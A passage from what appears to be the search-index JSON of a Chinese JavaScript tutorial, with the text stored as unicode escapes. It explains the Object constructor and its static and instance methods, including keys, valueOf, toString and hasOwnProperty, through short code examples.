\u65b9\u6cd5\u4e0e toString \u7684\u8fd4\u56de\u7ed3\u679c\u76f8\u540c\uff0c\u4e5f\u662f\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 var obj = {}; obj . toString ( obj ) // \"[object Object]\" obj . toLocaleString ( obj ) // \"[object Object]\" \u8fd9\u4e2a\u65b9\u6cd5\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u7559\u51fa\u4e00\u4e2a\u63a5\u53e3\uff0c\u8ba9\u5404\u79cd\u4e0d\u540c\u7684\u5bf9\u8c61\u5b9e\u73b0\u81ea\u5df1\u7248\u672c\u7684 toLocaleString \uff0c\u7528\u6765\u8fd4\u56de\u9488\u5bf9\u67d0\u4e9b\u5730\u57df\u7684\u7279\u5b9a\u7684\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 var person = { toString : function () { return 'Henry Norman Bethune' ; }, toLocaleString : function () { return '\u767d\u6c42\u6069' ; } }; person . toString () // Henry Norman Bethune person . toLocaleString () // \u767d\u6c42\u6069 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString() \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u7684\u4e00\u822c\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c toLocaleString() \u65b9\u6cd5\u8fd4\u56de\u672c\u5730\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 \u76ee\u524d\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u5bf9\u8c61\u81ea\u5b9a\u4e49\u4e86 toLocaleString \u65b9\u6cd5\u3002 Array.prototype.toLocaleString() Number.prototype.toLocaleString() Date.prototype.toLocaleString() \u4e3e\u4f8b\u6765\u8bf4\uff0c\u65e5\u671f\u7684\u5b9e\u4f8b\u5bf9\u8c61\u7684 toString \u548c toLocaleString \u8fd4\u56de\u503c\u5c31\u4e0d\u4e00\u6837\uff0c\u800c\u4e14 toLocaleString \u7684\u8fd4\u56de\u503c\u8ddf\u7528\u6237\u8bbe\u5b9a\u7684\u6240\u5728\u5730\u57df\u76f8\u5173\u3002 1 2 3 var date = new Date (); date . toString () // \"Tue Jan 01 2018 12:01:33 GMT+0800 (CST)\" date . toLocaleString () // \"1/01/2018, 12:01:33 PM\" Object.prototype.hasOwnProperty() \u00b6 Object.prototype.hasOwnProperty \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u662f\u5426\u5177\u6709\u8be5\u5c5e\u6027\u3002 1 2 3 4 5 6 var obj = { p : 123 }; obj . hasOwnProperty ( 'p' ) // true obj . hasOwnProperty ( 'toString' ) // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u81ea\u8eab\u5177\u6709 p \u5c5e\u6027\uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 toString \u5c5e\u6027\u662f\u7ee7\u627f\u7684\uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, Protecting objects in JavaScript kangax, Understanding delete Jon Bretman, Type Checking in JavaScript Cody Lindley, Thinking About ECMAScript 5 Parts Bjorn Tipling, Advanced objects in JavaScript Javier M\u00e1rquez, JavaScript properties are enumerable, writable and configurable Sella Rafaeli, Native JavaScript Data-Binding : \u4f7f\u7528\u5b58\u53d6\u51fd\u6570\u5b9e\u73b0model\u4e0eview\u7684\u53cc\u5411\u7ed1\u5b9a Lea Verou, Copying object properties, the robust way","title":"Object \u5bf9\u8c61"},{"location":"stdlib/object/#object","text":"","title":"Object \u5bf9\u8c61"},{"location":"stdlib/object/#_1","text":"JavaScript \u539f\u751f\u63d0\u4f9b Object \u5bf9\u8c61\uff08\u6ce8\u610f\u8d77\u9996\u7684 O \u662f\u5927\u5199\uff09\uff0c\u672c\u7ae0\u4ecb\u7ecd\u8be5\u5bf9\u8c61\u539f\u751f\u7684\u5404\u79cd\u65b9\u6cd5\u3002 JavaScript \u7684\u6240\u6709\u5176\u4ed6\u5bf9\u8c61\u90fd\u7ee7\u627f\u81ea Object \u5bf9\u8c61\uff0c\u5373\u90a3\u4e9b\u5bf9\u8c61\u90fd\u662f Object \u7684\u5b9e\u4f8b\u3002 Object \u5bf9\u8c61\u7684\u539f\u751f\u65b9\u6cd5\u5206\u6210\u4e24\u7c7b\uff1a Object \u672c\u8eab\u7684\u65b9\u6cd5\u4e0e Object \u7684\u5b9e\u4f8b\u65b9\u6cd5\u3002 \uff081\uff09 Object \u5bf9\u8c61\u672c\u8eab\u7684\u65b9\u6cd5 \u6240\u8c13\u201c\u672c\u8eab\u7684\u65b9\u6cd5\u201d\u5c31\u662f\u76f4\u63a5\u5b9a\u4e49\u5728 Object \u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 1 Object . print = function ( o ) { console . log ( o ) }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c print \u65b9\u6cd5\u5c31\u662f\u76f4\u63a5\u5b9a\u4e49\u5728 Object \u5bf9\u8c61\u4e0a\u3002 \uff082\uff09 Object \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u6240\u8c13\u5b9e\u4f8b\u65b9\u6cd5\u5c31\u662f\u5b9a\u4e49\u5728 Object \u539f\u578b\u5bf9\u8c61 Object.prototype \u4e0a\u7684\u65b9\u6cd5\u3002\u5b83\u53ef\u4ee5\u88ab Object \u5b9e\u4f8b\u76f4\u63a5\u4f7f\u7528\u3002 1 2 3 4 5 6 Object . prototype . print = function () { console . log ( this ); }; var obj = new Object (); obj . print () // Object \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object.prototype \u5b9a\u4e49\u4e86\u4e00\u4e2a print \u65b9\u6cd5\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a Object \u7684\u5b9e\u4f8b obj \u3002 obj \u76f4\u63a5\u7ee7\u627f\u4e86 Object.prototype \u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 obj.print \u8c03\u7528 print \u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c obj \u5bf9\u8c61\u7684 print \u65b9\u6cd5\u5b9e\u8d28\u4e0a\u5c31\u662f\u8c03\u7528 Object.prototype.print \u65b9\u6cd5\u3002 \u5173\u4e8e\u539f\u578b\u5bf9\u8c61 object.prototype \u7684\u8be6\u7ec6\u89e3\u91ca\uff0c\u53c2\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u7ae0\u8282\u3002\u8fd9\u91cc\u53ea\u8981\u77e5\u9053\uff0c\u51e1\u662f\u5b9a\u4e49\u5728 Object.prototype \u5bf9\u8c61\u4e0a\u9762\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5c06\u88ab\u6240\u6709\u5b9e\u4f8b\u5bf9\u8c61\u5171\u4eab\u5c31\u53ef\u4ee5\u4e86\u3002 \u4ee5\u4e0b\u5148\u4ecb\u7ecd Object \u4f5c\u4e3a\u51fd\u6570\u7684\u7528\u6cd5\uff0c\u7136\u540e\u518d\u4ecb\u7ecd Object \u5bf9\u8c61\u7684\u539f\u751f\u65b9\u6cd5\uff0c\u5206\u6210\u5bf9\u8c61\u81ea\u8eab\u7684\u65b9\u6cd5\uff08\u53c8\u79f0\u4e3a\u201c\u9759\u6001\u65b9\u6cd5\u201d\uff09\u548c\u5b9e\u4f8b\u65b9\u6cd5\u4e24\u90e8\u5206\u3002","title":"\u6982\u8ff0"},{"location":"stdlib/object/#object_1","text":"Object \u672c\u8eab\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5f53\u4f5c\u5de5\u5177\u65b9\u6cd5\u4f7f\u7528\uff0c\u5c06\u4efb\u610f\u503c\u8f6c\u4e3a\u5bf9\u8c61\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5e38\u7528\u4e8e\u4fdd\u8bc1\u67d0\u4e2a\u503c\u4e00\u5b9a\u662f\u5bf9\u8c61\u3002 \u5982\u679c\u53c2\u6570\u4e3a\u7a7a\uff08\u6216\u8005\u4e3a undefined \u548c null \uff09\uff0c Object() \u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002 1 2 3 4 5 6 var obj = Object (); // \u7b49\u540c\u4e8e var obj = Object ( undefined ); var obj = Object ( null ); obj instanceof Object // true \u4e0a\u9762\u4ee3\u7801\u7684\u542b\u4e49\uff0c\u662f\u5c06 undefined \u548c null \u8f6c\u4e3a\u5bf9\u8c61\uff0c\u7ed3\u679c\u5f97\u5230\u4e86\u4e00\u4e2a\u7a7a\u5bf9\u8c61 obj \u3002 instanceof \u8fd0\u7b97\u7b26\u7528\u6765\u9a8c\u8bc1\uff0c\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u6307\u5b9a\u7684\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u3002 obj instanceof Object \u8fd4\u56de true \uff0c\u5c31\u8868\u793a obj \u5bf9\u8c61\u662f Object \u7684\u5b9e\u4f8b\u3002 \u5982\u679c\u53c2\u6570\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c Object \u65b9\u6cd5\u5c06\u5176\u8f6c\u4e3a\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u7684\u5b9e\u4f8b\uff08\u53c2\u89c1\u300a\u539f\u59cb\u7c7b\u578b\u7684\u5305\u88c5\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 var obj = Object ( 1 ); obj instanceof Object // true obj instanceof Number // true var obj = Object ( 'foo' ); obj instanceof Object // true obj instanceof String // true var obj = Object ( true ); obj instanceof Object // true obj instanceof Boolean // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Object \u51fd\u6570\u7684\u53c2\u6570\u662f\u5404\u79cd\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u8f6c\u6362\u6210\u5bf9\u8c61\u5c31\u662f\u539f\u59cb\u7c7b\u578b\u503c\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\u3002 \u5982\u679c Object \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u603b\u662f\u8fd4\u56de\u8be5\u5bf9\u8c61\uff0c\u5373\u4e0d\u7528\u8f6c\u6362\u3002 1 2 3 4 5 6 7 8 9 10 11 var arr = []; var obj = Object ( arr ); // \u8fd4\u56de\u539f\u6570\u7ec4 obj === arr // true var value = {}; var obj = Object ( value ) // \u8fd4\u56de\u539f\u5bf9\u8c61 obj === value // true var fn = function () {}; var obj = Object ( fn ); // \u8fd4\u56de\u539f\u51fd\u6570 obj === fn // true \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5199\u4e00\u4e2a\u5224\u65ad\u53d8\u91cf\u662f\u5426\u4e3a\u5bf9\u8c61\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 function isObject ( value ) { return value === Object ( value ); } isObject ([]) // true isObject ( true ) // false","title":"Object()"},{"location":"stdlib/object/#object_2","text":"Object \u4e0d\u4ec5\u53ef\u4ee5\u5f53\u4f5c\u5de5\u5177\u51fd\u6570\u4f7f\u7528\uff0c\u8fd8\u53ef\u4ee5\u5f53\u4f5c\u6784\u9020\u51fd\u6570\u4f7f\u7528\uff0c\u5373\u524d\u9762\u53ef\u4ee5\u4f7f\u7528 new \u547d\u4ee4\u3002 Object \u6784\u9020\u51fd\u6570\u7684\u9996\u8981\u7528\u9014\uff0c\u662f\u76f4\u63a5\u901a\u8fc7\u5b83\u6765\u751f\u6210\u65b0\u5bf9\u8c61\u3002 1 var obj = new Object (); \u6ce8\u610f\uff0c\u901a\u8fc7 var obj = new Object() \u7684\u5199\u6cd5\u751f\u6210\u65b0\u5bf9\u8c61\uff0c\u4e0e\u5b57\u9762\u91cf\u7684\u5199\u6cd5 var obj = {} \u662f\u7b49\u4ef7\u7684\u3002\u6216\u8005\u8bf4\uff0c\u540e\u8005\u53ea\u662f\u524d\u8005\u7684\u4e00\u79cd\u7b80\u4fbf\u5199\u6cd5\u3002 Object \u6784\u9020\u51fd\u6570\u7684\u7528\u6cd5\u4e0e\u5de5\u5177\u65b9\u6cd5\u5f88\u76f8\u4f3c\uff0c\u51e0\u4e4e\u4e00\u6a21\u4e00\u6837\u3002\u4f7f\u7528\u65f6\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u8be5\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\uff1b\u5982\u679c\u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u8fd4\u56de\u8be5\u503c\u5bf9\u5e94\u7684\u5305\u88c5\u5bf9\u8c61\uff08\u8be6\u89c1\u300a\u5305\u88c5\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\u3002 1 2 3 4 5 6 var o1 = { a : 1 }; var o2 = new Object ( o1 ); o1 === o2 // true var obj = new Object ( 123 ); obj instanceof Number // true \u867d\u7136\u7528\u6cd5\u76f8\u4f3c\uff0c\u4f46\u662f Object(value) \u4e0e new Object(value) \u4e24\u8005\u7684\u8bed\u4e49\u662f\u4e0d\u540c\u7684\uff0c Object(value) \u8868\u793a\u5c06 value \u8f6c\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c new Object(value) \u5219\u8868\u793a\u65b0\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b83\u7684\u503c\u662f value \u3002","title":"Object \u6784\u9020\u51fd\u6570"},{"location":"stdlib/object/#object_3","text":"\u6240\u8c13\u201c\u9759\u6001\u65b9\u6cd5\u201d\uff0c\u662f\u6307\u90e8\u7f72\u5728 Object \u5bf9\u8c61\u81ea\u8eab\u7684\u65b9\u6cd5\u3002","title":"Object \u7684\u9759\u6001\u65b9\u6cd5"},{"location":"stdlib/object/#objectkeysobjectgetownpropertynames","text":"Object.keys \u65b9\u6cd5\u548c Object.getOwnPropertyNames \u65b9\u6cd5\u90fd\u7528\u6765\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 Object.keys \u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002\u8be5\u6570\u7ec4\u7684\u6210\u5458\u90fd\u662f\u8be5\u5bf9\u8c61\u81ea\u8eab\u7684\uff08\u800c\u4e0d\u662f\u7ee7\u627f\u7684\uff09\u6240\u6709\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 var obj = { p1 : 123 , p2 : 456 }; Object . keys ( obj ) // [\"p1\", \"p2\"] Object.getOwnPropertyNames \u65b9\u6cd5\u4e0e Object.keys \u7c7b\u4f3c\uff0c\u4e5f\u662f\u63a5\u53d7\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u4e86\u8be5\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u5c5e\u6027\u540d\u3002 1 2 3 4 5 6 var obj = { p1 : 123 , p2 : 456 }; Object . getOwnPropertyNames ( obj ) // [\"p1\", \"p2\"] \u5bf9\u4e8e\u4e00\u822c\u7684\u5bf9\u8c61\u6765\u8bf4\uff0c Object.keys() \u548c Object.getOwnPropertyNames() \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u6837\u7684\u3002\u53ea\u6709\u6d89\u53ca\u4e0d\u53ef\u679a\u4e3e\u5c5e\u6027\u65f6\uff0c\u624d\u4f1a\u6709\u4e0d\u4e00\u6837\u7684\u7ed3\u679c\u3002 Object.keys \u65b9\u6cd5\u53ea\u8fd4\u56de\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\uff08\u8be6\u89c1\u300a\u5bf9\u8c61\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u300b\u4e00\u7ae0\uff09\uff0c Object.getOwnPropertyNames \u65b9\u6cd5\u8fd8\u8fd4\u56de\u4e0d\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\u540d\u3002 1 2 3 4 var a = [ 'Hello' , 'World' ]; Object . keys ( a ) // [\"0\", \"1\"] Object . getOwnPropertyNames ( a ) // [\"0\", \"1\", \"length\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u7684 length \u5c5e\u6027\u662f\u4e0d\u53ef\u679a\u4e3e\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u53ea\u51fa\u73b0\u5728 Object.getOwnPropertyNames \u65b9\u6cd5\u7684\u8fd4\u56de\u7ed3\u679c\u4e2d\u3002 \u7531\u4e8e JavaScript \u6ca1\u6709\u63d0\u4f9b\u8ba1\u7b97\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4ee3\u66ff\u3002 1 2 3 4 5 6 7 var obj = { p1 : 123 , p2 : 456 }; Object . keys ( obj ). length // 2 Object . getOwnPropertyNames ( obj ). length // 2 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u51e0\u4e4e\u603b\u662f\u4f7f\u7528 Object.keys \u65b9\u6cd5\uff0c\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u3002","title":"Object.keys()\uff0cObject.getOwnPropertyNames()"},{"location":"stdlib/object/#_2","text":"\u9664\u4e86\u4e0a\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u65b9\u6cd5\uff0c Object \u8fd8\u6709\u4e0d\u5c11\u5176\u4ed6\u9759\u6001\u65b9\u6cd5\uff0c\u5c06\u5728\u540e\u6587\u9010\u4e00\u8be6\u7ec6\u4ecb\u7ecd\u3002 \uff081\uff09\u5bf9\u8c61\u5c5e\u6027\u6a21\u578b\u7684\u76f8\u5173\u65b9\u6cd5 Object.getOwnPropertyDescriptor() \uff1a\u83b7\u53d6\u67d0\u4e2a\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002 Object.defineProperty() \uff1a\u901a\u8fc7\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u67d0\u4e2a\u5c5e\u6027\u3002 Object.defineProperties() \uff1a\u901a\u8fc7\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u591a\u4e2a\u5c5e\u6027\u3002 \uff082\uff09\u63a7\u5236\u5bf9\u8c61\u72b6\u6001\u7684\u65b9\u6cd5 Object.preventExtensions() \uff1a\u9632\u6b62\u5bf9\u8c61\u6269\u5c55\u3002 Object.isExtensible() \uff1a\u5224\u65ad\u5bf9\u8c61\u662f\u5426\u53ef\u6269\u5c55\u3002 Object.seal() \uff1a\u7981\u6b62\u5bf9\u8c61\u914d\u7f6e\u3002 Object.isSealed() \uff1a\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u53ef\u914d\u7f6e\u3002 Object.freeze() \uff1a\u51bb\u7ed3\u4e00\u4e2a\u5bf9\u8c61\u3002 Object.isFrozen() \uff1a\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u88ab\u51bb\u7ed3\u3002 \uff083\uff09\u539f\u578b\u94fe\u76f8\u5173\u65b9\u6cd5 Object.create() \uff1a\u8be5\u65b9\u6cd5\u53ef\u4ee5\u6307\u5b9a\u539f\u578b\u5bf9\u8c61\u548c\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\u3002 Object.getPrototypeOf() \uff1a\u83b7\u53d6\u5bf9\u8c61\u7684 Prototype \u5bf9\u8c61\u3002","title":"\u5176\u4ed6\u65b9\u6cd5"},{"location":"stdlib/object/#object_4","text":"\u9664\u4e86\u9759\u6001\u65b9\u6cd5\uff0c\u8fd8\u6709\u4e0d\u5c11\u65b9\u6cd5\u5b9a\u4e49\u5728 Object.prototype \u5bf9\u8c61\u3002\u5b83\u4eec\u79f0\u4e3a\u5b9e\u4f8b\u65b9\u6cd5\uff0c\u6240\u6709 Object \u7684\u5b9e\u4f8b\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86\u8fd9\u4e9b\u65b9\u6cd5\u3002 Object \u5b9e\u4f8b\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u516d\u4e2a\u3002 Object.prototype.valueOf() \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u503c\u3002 Object.prototype.toString() \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 Object.prototype.toLocaleString() \uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u672c\u5730\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 Object.prototype.hasOwnProperty() \uff1a\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u4e3a\u5f53\u524d\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u662f\u7ee7\u627f\u81ea\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 Object.prototype.isPrototypeOf() \uff1a\u5224\u65ad\u5f53\u524d\u5bf9\u8c61\u662f\u5426\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u3002 Object.prototype.propertyIsEnumerable() \uff1a\u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u53ef\u679a\u4e3e\u3002 \u672c\u8282\u4ecb\u7ecd\u524d\u56db\u4e2a\u65b9\u6cd5\uff0c\u53e6\u5916\u4e24\u4e2a\u65b9\u6cd5\u5c06\u5728\u540e\u6587\u76f8\u5173\u7ae0\u8282\u4ecb\u7ecd\u3002","title":"Object \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/object/#objectprototypevalueof","text":"valueOf \u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u201c\u503c\u201d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd4\u56de\u5bf9\u8c61\u672c\u8eab\u3002 1 2 var obj = new Object (); obj . valueOf () === obj // true \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83 obj.valueOf() \u4e0e obj \u672c\u8eab\uff0c\u4e24\u8005\u662f\u4e00\u6837\u7684\u3002 valueOf \u65b9\u6cd5\u7684\u4e3b\u8981\u7528\u9014\u662f\uff0cJavaScript \u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u65f6\u4f1a\u9ed8\u8ba4\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff08\u8be6\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\uff09\u3002 1 2 var obj = new Object (); 1 + obj // \"1[object Object]\" \u4e0a\u9762\u4ee3\u7801\u5c06\u5bf9\u8c61 obj \u4e0e\u6570\u5b57 1 \u76f8\u52a0\uff0c\u8fd9\u65f6 JavaScript \u5c31\u4f1a\u9ed8\u8ba4\u8c03\u7528 valueOf() \u65b9\u6cd5\uff0c\u6c42\u51fa obj \u7684\u503c\u518d\u4e0e 1 \u76f8\u52a0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u81ea\u5b9a\u4e49 valueOf \u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u60f3\u8981\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 var obj = new Object (); obj . valueOf = function () { return 2 ; }; 1 + obj // 3 \u4e0a\u9762\u4ee3\u7801\u81ea\u5b9a\u4e49\u4e86 obj \u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\uff0c\u4e8e\u662f 1 + obj \u5c31\u5f97\u5230\u4e86 3 \u3002\u8fd9\u79cd\u65b9\u6cd5\u5c31\u76f8\u5f53\u4e8e\u7528\u81ea\u5b9a\u4e49\u7684 obj.valueOf \uff0c\u8986\u76d6 Object.prototype.valueOf \u3002","title":"Object.prototype.valueOf()"},{"location":"stdlib/object/#objectprototypetostring","text":"toString \u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd4\u56de\u7c7b\u578b\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 var o1 = new Object (); o1 . toString () // \"[object Object]\" var o2 = { a : 1 }; o2 . toString () // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5bf9\u8c61\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u4f1a\u8fd4\u56de\u5b57\u7b26\u4e32 [object Object] \uff0c\u8be5\u5b57\u7b26\u4e32\u8bf4\u660e\u5bf9\u8c61\u7684\u7c7b\u578b\u3002 \u5b57\u7b26\u4e32 [object Object] \u672c\u8eab\u6ca1\u6709\u592a\u5927\u7684\u7528\u5904\uff0c\u4f46\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\uff0c\u53ef\u4ee5\u8ba9\u5bf9\u8c61\u5728\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u65f6\uff0c\u5f97\u5230\u60f3\u8981\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 5 6 7 var obj = new Object (); obj . toString = function () { return 'hello' ; }; obj + ' ' + 'world' // \"hello world\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5f53\u5bf9\u8c61\u7528\u4e8e\u5b57\u7b26\u4e32\u52a0\u6cd5\u65f6\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528 toString \u65b9\u6cd5\u3002\u7531\u4e8e\u81ea\u5b9a\u4e49\u4e86 toString \u65b9\u6cd5\uff0c\u6240\u4ee5\u8fd4\u56de\u5b57\u7b26\u4e32 hello world \u3002 \u6570\u7ec4\u3001\u5b57\u7b26\u4e32\u3001\u51fd\u6570\u3001Date \u5bf9\u8c61\u90fd\u5206\u522b\u90e8\u7f72\u4e86\u81ea\u5b9a\u4e49\u7684 toString \u65b9\u6cd5\uff0c\u8986\u76d6\u4e86 Object.prototype.toString \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 [ 1 , 2 , 3 ]. toString () // \"1,2,3\" '123' . toString () // \"123\" ( function () { return 123 ; }). toString () // \"function () { // return 123; // }\" ( new Date ()). toString () // \"Tue May 10 2016 09:11:31 GMT+0800 (CST)\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4\u3001\u5b57\u7b26\u4e32\u3001\u51fd\u6570\u3001Date \u5bf9\u8c61\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u5e76\u4e0d\u4f1a\u8fd4\u56de [object Object] \uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u81ea\u5b9a\u4e49\u4e86 toString \u65b9\u6cd5\uff0c\u8986\u76d6\u539f\u59cb\u65b9\u6cd5\u3002","title":"Object.prototype.toString()"},{"location":"stdlib/object/#tostring","text":"Object.prototype.toString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u8c61\u7684\u7c7b\u578b\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u503c\u7684\u7c7b\u578b\u3002 1 2 var obj = {}; obj . toString () // \"[object Object]\" \u4e0a\u9762\u4ee3\u7801\u8c03\u7528\u7a7a\u5bf9\u8c61\u7684 toString \u65b9\u6cd5\uff0c\u7ed3\u679c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32 object Object \uff0c\u5176\u4e2d\u7b2c\u4e8c\u4e2a Object \u8868\u793a\u8be5\u503c\u7684\u6784\u9020\u51fd\u6570\u3002\u8fd9\u662f\u4e00\u4e2a\u5341\u5206\u6709\u7528\u7684\u5224\u65ad\u6570\u636e\u7c7b\u578b\u7684\u65b9\u6cd5\u3002 \u7531\u4e8e\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u80fd\u4f1a\u81ea\u5b9a\u4e49 toString \u65b9\u6cd5\uff0c\u8986\u76d6\u6389 Object.prototype.toString \u65b9\u6cd5\uff0c\u6240\u4ee5\u4e3a\u4e86\u5f97\u5230\u7c7b\u578b\u5b57\u7b26\u4e32\uff0c\u6700\u597d\u76f4\u63a5\u4f7f\u7528 Object.prototype.toString \u65b9\u6cd5\u3002\u901a\u8fc7\u51fd\u6570\u7684 call 